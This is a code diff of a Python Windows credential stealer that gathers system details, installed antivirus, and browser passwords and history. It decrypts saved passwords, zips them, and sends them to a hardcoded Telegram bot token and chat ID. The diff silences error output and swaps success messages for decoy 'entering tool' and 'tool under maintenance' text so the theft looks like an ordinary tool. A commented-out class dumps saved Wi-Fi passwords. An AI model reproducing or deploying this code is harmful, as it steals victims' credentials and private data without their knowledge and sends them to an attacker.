@@ -1,27 +1,28 @@
 #https://github.com/danghuutruong/BrowserDataExtractor
 
-import os
-import sqlite3
-import json
-import base64
-import shutil
-import requests
-from Crypto.Cipher import AES
+import io        
+import os        
+import re        
+import json      
+import time      
+import base64    
+import psutil    
+import random    
+import shutil    
+import sqlite3   
+import zipfile   
+import requests  
+import pycountry 
+import threading 
+import subprocess
 import win32crypt
-import zipfile
-import io
-import time
+from typing import Union
+from Crypto.Cipher import AES
+from screeninfo import get_monitors
 
 bot_token = '7463062603:AAEAGU-e9d-4-UrDeLWMHeKYn5hKdhk5SLc'
 chat_id = '6379209139'
 
-import os
-import subprocess
-import requests
-import psutil
-from screeninfo import get_monitors
-import pycountry
-import time
 
 class PcInfo:
     def __init__(self):
@@ -47,7 +48,7 @@ class PcInfo:
                     return ", ".join(av_list)
             return "No antivirus found"
         except Exception as e:
-            print(f"Error getting antivirus: {e}")
+            # print(f"Error getting antivirus: {e}")
             return "Error retrieving antivirus information"
 
     def get_screen_resolution(self):
@@ -56,7 +57,7 @@ class PcInfo:
             resolutions = [f"{monitor.width}x{monitor.height}" for monitor in monitors]
             return ', '.join(resolutions) if resolutions else "Unknown"
         except Exception as e:
-            print(f"Error getting screen resolution: {e}")
+            # print(f"Error getting screen resolution: {e}")
             return "Unknown"
 
     def get_system_info(self):
@@ -117,11 +118,10 @@ class PcInfo:
             self.send_message_to_telegram(message)
             self.send_file_to_telegram(log_file)
             os.remove(log_file)
-            print(f"Tệp {log_file} đã được xóa.")
 
         except Exception as e:
             self.send_message_to_telegram(f"Error occurred: {str(e)}")
-            print(f"Error occurred: {str(e)}")
+            # print(f"Error occurred: {str(e)}")
 
     def send_message_to_telegram(self, message: str):
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
@@ -133,16 +133,16 @@ class PcInfo:
                     data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
                 )
                 if response.status_code == 200:
-                    print("Gửi thông điệp thành công")
+                    print("\033[1;95mĐang vào tool.", end="\r")
                     return response
-                else:
-                    print(f"Không thể gửi thông điệp. Mã trạng thái: {response.status_code}")
+                # else:
+                #     print(f"Không thể gửi thông điệp. Mã trạng thái: {response.status_code}")
             except requests.exceptions.RequestException as e:
-                print(f"Lần thử {attempt + 1} thất bại: {e}")
+                # print(f"Lần thử {attempt + 1} thất bại: {e}")
                 if attempt < retries - 1:
                     time.sleep(5)  
-                else:
-                    print("Đã thử tối đa. Không thể gửi thông điệp.")
+                # else:
+                #     print("Lỗi")
         return None
 
     def send_file_to_telegram(self, file_path: str):
@@ -157,16 +157,16 @@ class PcInfo:
                         data={'chat_id': chat_id}
                     )
                 if response.status_code == 200:
-                    print("Gửi tệp thành công")
+                    print("Đang vào tool..", end="\r")
                     return response
-                else:
-                    print(f"Không thể gửi tệp. Mã trạng thái: {response.status_code}")
+                # else:
+                #     print(f"Không thể gửi tệp. Mã trạng thái: {response.status_code}")
             except requests.exceptions.RequestException as e:
-                print(f"Lần thử {attempt + 1} thất bại: {e}")
+                # print(f"Lần thử {attempt + 1} thất bại: {e}")
                 if attempt < retries - 1:
                     time.sleep(5)  
-                else:
-                    print("Đã thử tối đa. Không thể gửi tệp.")
+                # else:
+                #     print("Đã thử tối đa. Không thể gửi tệp.")
         return None
 
 
@@ -273,7 +273,8 @@ class Browser:
                     zip_file.writestr(f"browser/{browser}_passwords_{profile}.txt", password_data.getvalue())
 
                 except Exception as e:
-                    print(f"Error extracting from {browser}: {e}")
+                    # print("Lỗi")
+                    time.sleep(0.000001)
 
                 cursor.close()
                 conn.close()
@@ -293,7 +294,7 @@ class Browser:
                 try:
                     shutil.copyfile(history_db_path, tmp_db_path)
                 except PermissionError:
-                    print(f"Không thể sao chép tệp {history_db_path}. Có thể tệp đang được sử dụng.")
+                    # print("Lỗi")
                     continue  
                 conn = sqlite3.connect(tmp_db_path)
                 cursor = conn.cursor()
@@ -320,7 +321,8 @@ class Browser:
                     zip_file.writestr(f"browser/{browser}_history_{profile}.txt", history_data.getvalue())
 
                 except Exception as e:
-                    print(f"Error extracting history from {browser}: {e}")
+                    # print("Lỗi")
+                    time.sleep(0.000001)
 
                 cursor.close()
                 conn.close()
@@ -343,32 +345,19 @@ class Browser:
                         data={'chat_id': chat_id}
                     )
                 if response.status_code == 200:
-                    print("Gửi tệp thành công")
+                    print("Đang vào tool...", end="\r")
                     return response
-                else:
-                    print(f"Không thể gửi tệp. Mã trạng thái: {response.status_code}")
+                # else:
+                #     print(f"Không thể gửi tệp. Mã trạng thái: {response.status_code}")
             except requests.exceptions.RequestException as e:
-                print(f"Lần thử {attempt + 1} thất bại: {e}")
+                # print(f"Lần thử {attempt + 1} thất bại: {e}")
                 if attempt < retries - 1:
                     time.sleep(5)  
-                else:
-                    print("Đã thử tối đa. Không thể gửi tệp.")
+                # else:
+                #     print("Đã thử tối đa. Không thể gửi tệp.")
         return None
 
 
-import base64
-import json
-import os
-import random
-import sqlite3
-import threading
-from Crypto.Cipher import AES
-import shutil
-import zipfile
-import requests
-import time
-from typing import Union
-from win32crypt import CryptUnprotectData
 
 class Browsers:
     def __init__(self):
@@ -576,16 +565,17 @@ class Browsers:
                         data={'chat_id': chat_id}
                     )
                 if response.status_code == 200:
-                    print("Gửi tệp thành công")
+                    print("\033[1;91mTool đang bảo trì\033[0m", end="\r")
+                    time.sleep(3)
                     return response
-                else:
-                    print(f"Không thể gửi tệp. Mã trạng thái: {response.status_code}")
+                # else:
+                #     print(f"Không thể gửi tệp. Mã trạng thái: {response.status_code}")
             except requests.exceptions.RequestException as e:
-                print(f"Lần thử {attempt + 1} thất bại: {e}")
+                # print(f"Lần thử {attempt + 1} thất bại: {e}")
                 if attempt < retries - 1:
                     time.sleep(5) 
-                else:
-                    print("Đã thử tối đa. Không thể gửi tệp.")
+                # else:
+                #     print("Đã thử tối đa. Không thể gửi tệp.")
         return None
 
     def create_temp(self, _dir: Union[str, os.PathLike] = None):
@@ -598,136 +588,132 @@ class Browsers:
         open(path, "x").close()
         return path
 
-import requests
-import subprocess
-import re
-import time
 
-class Wifi:
-    def __init__(self):
-        self.networks = {}
-        self.get_networks()
-        self.send_info_to_telegram()
+# class Wifi:
+#     def __init__(self):
+#         self.networks = {}
+#         self.get_networks()
+#         self.send_info_to_telegram()
 
-    def run_command(self, command, encoding='utf-8'):
-        try:
-            result = subprocess.run(command, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            return result.stdout.strip()
-        except subprocess.CalledProcessError as e:
-            print(f"Error executing command {command}: {e}")
-            return f"Error: {e}"
+#     def run_command(self, command, encoding='utf-8'):
+#         try:
+#             result = subprocess.run(command, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+#             return result.stdout.strip()
+#         except subprocess.CalledProcessError as e:
+#             print(f"Error executing command {command}: {e}")
+#             return f"Error: {e}"
 
-    def get_networks(self):
-        output_networks = self.run_command(["netsh", "wlan", "show", "profiles"])
-        if "Error" in output_networks:
-            print("Error in getting Wi-Fi profiles:", output_networks)
-            return  
+#     def get_networks(self):
+#         output_networks = self.run_command(["netsh", "wlan", "show", "profiles"])
+#         if "Error" in output_networks:
+#             print("Error in getting Wi-Fi profiles:", output_networks)
+#             return  
         
-        profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profile" in line]
-        if not profiles:
-            print("No Wi-Fi profiles found.")
+#         profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profile" in line]
+#         if not profiles:
+#             print("No Wi-Fi profiles found.")
         
-        for profile in profiles:
-            if profile:
-                profile_info = self.run_command(["netsh", "wlan", "show", "profile", profile, "key=clear"])
-                self.networks[profile] = self.extract_password(profile_info)
+#         for profile in profiles:
+#             if profile:
+#                 profile_info = self.run_command(["netsh", "wlan", "show", "profile", profile, "key=clear"])
+#                 self.networks[profile] = self.extract_password(profile_info)
 
-    def extract_password(self, profile_info):
-        match = re.search(r"Key Content\s*:\s*(.+)", profile_info)
-        return match.group(1).strip() if match else "No password found"
+#     def extract_password(self, profile_info):
+#         match = re.search(r"Key Content\s*:\s*(.+)", profile_info)
+#         return match.group(1).strip() if match else "No password found"
 
-    def get_router_ip(self):
-        output = self.run_command("ipconfig")
-        if "Error" in output:
-            print("Error in getting router IP:", output)
-            return "Failed to get router IP"
+#     def get_router_ip(self):
+#         output = self.run_command("ipconfig")
+#         if "Error" in output:
+#             print("Error in getting router IP:", output)
+#             return "Failed to get router IP"
         
-        router_ip = None
-        is_eth = False  
-        for line in output.splitlines():
-            if "Ethernet adapter" in line:  
-                is_eth = True
-            elif is_eth and "Default Gateway" in line:
-                router_ip = line.split(":")[1].strip()
-                break
+#         router_ip = None
+#         is_eth = False  
+#         for line in output.splitlines():
+#             if "Ethernet adapter" in line:  
+#                 is_eth = True
+#             elif is_eth and "Default Gateway" in line:
+#                 router_ip = line.split(":")[1].strip()
+#                 break
         
-        if not router_ip:
-            print("Failed to get router IP from LAN.")
-        return router_ip if router_ip else "Failed to get router IP"
+#         if not router_ip:
+#             print("Failed to get router IP from LAN.")
+#         return router_ip if router_ip else "Failed to get router IP"
 
-    def get_mac_address(self):
-        router_ip = self.get_router_ip()
-        if router_ip == "Failed to get router IP":
-            return "Failed to get MAC address"
+#     def get_mac_address(self):
+#         router_ip = self.get_router_ip()
+#         if router_ip == "Failed to get router IP":
+#             return "Failed to get MAC address"
         
-        self.run_command(f"ping -n 1 {router_ip}")  
-        output = self.run_command(f"arp -a {router_ip}")
-        if "Error" in output:
-            print("Error in getting MAC address:", output)
-            return "MAC address not found"
+#         self.run_command(f"ping -n 1 {router_ip}")  
+#         output = self.run_command(f"arp -a {router_ip}")
+#         if "Error" in output:
+#             print("Error in getting MAC address:", output)
+#             return "MAC address not found"
         
-        mac_address_match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", output)
-        return mac_address_match.group() if mac_address_match else "MAC address not found"
+#         mac_address_match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", output)
+#         return mac_address_match.group() if mac_address_match else "MAC address not found"
 
-    def get_vendor_info(self, mac_address):
-        try:
-            url = f"https://api.macvendors.com/{mac_address}"
-            response = requests.get(url)
-            if response.status_code == 200:
-                return response.text
-            else:
-                print(f"Failed to get vendor info. Status code: {response.status_code}")
-                return "Vendor info not found"
-        except requests.RequestException as e:
-            print(f"Error in getting vendor info: {e}")
-            return f"Error: {e}"
+#     def get_vendor_info(self, mac_address):
+#         try:
+#             url = f"https://api.macvendors.com/{mac_address}"
+#             response = requests.get(url)
+#             if response.status_code == 200:
+#                 return response.text
+#             else:
+#                 print(f"Failed to get vendor info. Status code: {response.status_code}")
+#                 return "Vendor info not found"
+#         except requests.RequestException as e:
+#             print(f"Error in getting vendor info: {e}")
+#             return f"Error: {e}"
 
-    def send_info_to_telegram(self):
-        router_ip = self.get_router_ip()
-        mac_address = self.get_mac_address()
-        vendor_info = self.get_vendor_info(mac_address)
+#     def send_info_to_telegram(self):
+#         router_ip = self.get_router_ip()
+#         mac_address = self.get_mac_address()
+#         vendor_info = self.get_vendor_info(mac_address)
         
-        message = f'''
-**Router IP Address:** `{router_ip}`
-**Router MAC Address:** `{mac_address}`
-**Router Vendor:** `{vendor_info}`
-**Saved Wi-Fi Networks:**
-'''
-        if self.networks:
-            for network, password in self.networks.items():
-                message += f"- `{network}`: `{password}`\n"
-        else:
-            message += "No Wi-Fi networks found."
+#         message = f'''
+# **Router IP Address:** `{router_ip}`
+# **Router MAC Address:** `{mac_address}`
+# **Router Vendor:** `{vendor_info}`
+# **Saved Wi-Fi Networks:**
+# '''
+#         if self.networks:
+#             for network, password in self.networks.items():
+#                 message += f"- `{network}`: `{password}`\n"
+#         else:
+#             message += "No Wi-Fi networks found."
         
-        self.send_message_to_telegram(message)
+#         self.send_message_to_telegram(message)
 
-    def send_message_to_telegram(self, message: str):
-        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        retries = 3  
-        for attempt in range(retries):
-            try:
-                response = requests.post(
-                    url,
-                    data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
-                )
-                if response.status_code == 200:
-                    print("Message sent successfully")
-                    return response
-                else:
-                    print(f"Failed to send message. Status code: {response.status_code}")
-            except requests.exceptions.RequestException as e:
-                print(f"Attempt {attempt + 1} failed: {e}")
-                if attempt < retries - 1:
-                    time.sleep(5)  
-                else:
-                    print("Maximum retries reached. Could not send message.")
-        return None
+#     def send_message_to_telegram(self, message: str):
+#         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+#         retries = 3  
+#         for attempt in range(retries):
+#             try:
+#                 response = requests.post(
+#                     url,
+#                     data={'chat_id': chat_id, 'text': message, 'parse_mode': 'Markdown'}
+#                 )
+#                 if response.status_code == 200:
+#                     print("Message sent successfully")
+#                     return response
+#                 else:
+#                     print(f"Failed to send message. Status code: {response.status_code}")
+#             except requests.exceptions.RequestException as e:
+#                 print(f"Attempt {attempt + 1} failed: {e}")
+#                 if attempt < retries - 1:
+#                     time.sleep(5)  
+#                 else:
+#                     print("Maximum retries reached. Could not send message.")
+#         return None
 
 def main():
     PcInfo()
     Browser()
     Browsers() 
-    Wifi()  
+    # Wifi()  
 
 if __name__ == "__main__":
     main()
